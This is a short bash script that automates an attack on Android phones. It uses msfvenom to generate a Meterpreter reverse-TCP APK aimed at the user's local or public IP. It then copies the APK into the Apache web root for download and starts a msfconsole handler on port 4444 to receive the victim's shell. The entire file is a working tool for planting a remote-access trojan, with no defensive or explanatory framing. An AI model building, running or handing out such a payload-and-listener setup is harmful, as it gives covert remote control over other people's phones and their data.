#!/bin/bash
if [[ $EUID -ne 0 ]]
then
	echo "pls run as root"
else
	echo -e "IS the payload local or public"
	echo -e "If the payload is local enter 'yes' else 'no' : \c"
	read ans
	if [[ $ans == "yes" ]]
	then
		ifconfig
		echo -e "pls enter the your ip : \c"
		read ip_name
		echo -e "pls enter the name of the payload with .apk extions : \c"
		read payload_name
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_name LPORT=4444 R > $payload_name
		/etc/init.d/apache2 start
		mv /var/www/html/index.html /var/www/html/index_eg.html
		rm /var/www/html/index.nginx-debian.html
		cp $payload_name /var/www/html
		msfconsole -x "handler -p android/meterpreter/reverse_tcp -H $ip_name -P 4444"
	else
		host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has"
		echo -e "Enter the public ip : \c"
		read pub_ip
		ifconfig
		echo -e "Enter the local ip : \c"
		read loc_ip
		echo -e "Enter the payload name : \c"
		read payload_name
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$pub_ip LPORT=4444 R > $payload_name
		/etc/init.d/apache2 start
		mv /var/www/html/index.html /var/www/html/index_eg.html
		rm /var/www/html/index.nginx-debian.html
		cp $payload_name /var/www/html
		msfconsole -x "handler -p android/meterpreter/reverse_tcp -H $loc_ip -P 4444"
	fi


fi
